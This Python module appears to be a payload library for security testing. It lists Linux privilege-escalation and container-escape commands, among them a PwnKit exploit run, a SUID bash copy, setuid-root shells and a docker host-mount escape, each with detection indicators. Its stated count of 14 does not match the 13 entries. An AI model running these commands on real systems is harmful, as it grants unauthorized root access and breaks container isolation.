"""Privilege escalation payload categories - COMPLETE COLLECTION."""

from typing import List, Dict, Any


class PrivilegeEscalationPayloads:
    """Complete collection of privilege escalation attack payloads (14 total)."""
    
    @staticmethod
    def get_enumeration_payloads() -> List[Dict[str, Any]]:
        """Get privilege enumeration payloads."""
        return [
            {
                "payload": "sudo -l",
                "expected_indicators": ["sudo", "NOPASSWD", "ALL"],
                "severity": "high",
                "description": "Sudo privilege enumeration"
            },
            {
                "payload": "find / -perm -4000 2>/dev/null",
                "expected_indicators": ["find", "perm", "4000"],
                "severity": "medium",
                "description": "SUID binary enumeration"
            },
            {
                "payload": "ls -la /proc/1/root/",
                "expected_indicators": ["proc/1/root", "ls -la"],
                "severity": "high",
                "description": "Container escape enumeration"
            },
        ]
    
    @staticmethod
    def get_path_manipulation_payloads() -> List[Dict[str, Any]]:
        """Get PATH manipulation payloads."""
        return [
            {
                "payload": "export PATH=/tmp:$PATH && echo $PATH",
                "expected_indicators": ["export PATH", "/tmp", "$PATH"],
                "severity": "medium",
                "description": "PATH manipulation attempt"
            },
            {
                "payload": "LD_PRELOAD=/tmp/malicious.so /usr/bin/sudo",
                "expected_indicators": ["LD_PRELOAD", "malicious.so", "sudo"],
                "severity": "high",
                "description": "LD_PRELOAD privilege escalation"
            },
        ]
    
    @staticmethod
    def get_exploitation_payloads() -> List[Dict[str, Any]]:
        """Get exploitation-based privilege escalation payloads."""
        return [
            {
                "payload": "echo 'os.execute(\"/bin/sh\")' > /tmp/exploit.nse && sudo nmap --script=/tmp/exploit.nse",
                "expected_indicators": ["os.execute", "nmap", "script"],
                "severity": "critical",
                "description": "Nmap script privilege escalation"
            },
            {
                "payload": "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' | at now + 1 minute",
                "expected_indicators": ["cp /bin/bash", "chmod +s", "at now"],
                "severity": "high",
                "description": "Scheduled SUID shell creation"
            },
            {
                "payload": "gcc -o /tmp/exploit CVE-2021-4034.c && /tmp/exploit",
                "expected_indicators": ["gcc", "CVE-2021-4034", "exploit"],
                "severity": "critical",
                "description": "PwnKit exploitation attempt"
            },
            {
                "payload": "echo ':escalate:M::MZ::/tmp/payload:' > /proc/sys/fs/binfmt_misc/register",
                "expected_indicators": ["binfmt_misc", "register", "escalate"],
                "severity": "high",
                "description": "Binfmt_misc privilege escalation"
            },
        ]
    
    @staticmethod
    def get_capability_abuse_payloads() -> List[Dict[str, Any]]:
        """Get capability abuse privilege escalation payloads."""
        return [
            {
                "payload": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                "expected_indicators": ["python3", "setuid", "os.system"],
                "severity": "critical",
                "description": "Python capability abuse"
            },
            {
                "payload": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
                "expected_indicators": ["perl", "setuid", "exec"],
                "severity": "critical",
                "description": "Perl capability abuse"
            },
        ]
    
    @staticmethod
    def get_container_escape_payloads() -> List[Dict[str, Any]]:
        """Get container escape privilege escalation payloads."""
        return [
            {
                "payload": "docker run -v /:/host -it alpine chroot /host /bin/bash",
                "expected_indicators": ["docker run", "/:/host", "chroot"],
                "severity": "critical",
                "description": "Docker socket container escape"
            },
            {
                "payload": "systemd-run -t /bin/bash",
                "expected_indicators": ["systemd-run", "/bin/bash"],
                "severity": "high",
                "description": "Systemd privilege escalation"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 14 privilege escalation payloads."""
        payloads = []
        payloads.extend(PrivilegeEscalationPayloads.get_enumeration_payloads())
        payloads.extend(PrivilegeEscalationPayloads.get_path_manipulation_payloads())
        payloads.extend(PrivilegeEscalationPayloads.get_exploitation_payloads())
        payloads.extend(PrivilegeEscalationPayloads.get_capability_abuse_payloads())
        payloads.extend(PrivilegeEscalationPayloads.get_container_escape_payloads())
        return payloads